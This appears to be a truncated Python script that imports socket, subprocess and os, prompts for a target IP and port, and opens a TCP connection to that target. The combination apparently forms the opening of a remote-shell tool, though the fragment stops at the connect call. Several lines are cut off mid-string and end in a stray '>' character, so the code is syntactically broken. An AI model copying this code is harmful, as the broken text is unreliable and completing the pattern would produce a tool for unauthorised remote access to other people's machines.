import socket
import subprocess
import os

# Prompt the user for target IP and port
target_ip = input("Enter the target IP addre>
target_port = int(input("Enter the target po>

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOC>

try:
    # Connect to the target
    s.connect((target_ip, target_port))
